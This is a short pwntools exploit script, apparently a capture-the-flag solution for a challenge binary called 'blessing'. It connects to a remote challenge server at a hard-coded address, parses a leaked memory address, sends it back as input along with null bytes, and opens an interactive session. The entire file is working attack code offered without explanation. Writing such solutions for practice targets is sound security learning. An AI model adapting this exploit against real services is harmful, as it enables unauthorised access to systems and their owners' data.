from pwn import *

elf = ELF("./blessing_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf

# p = process()
# gdb.attach(p, "break *main+273")
p = remote("83.136.253.44", 58198)

p.recvuntil(b'this: ')

leak = int(p.recvline().replace(b'\x08', b'').strip(), 16)

print(hex(leak))

p.sendlineafter(b': ', str(leak).encode())
p.sendlineafter(b': ', b'\x00' * 10)

p.interactive()
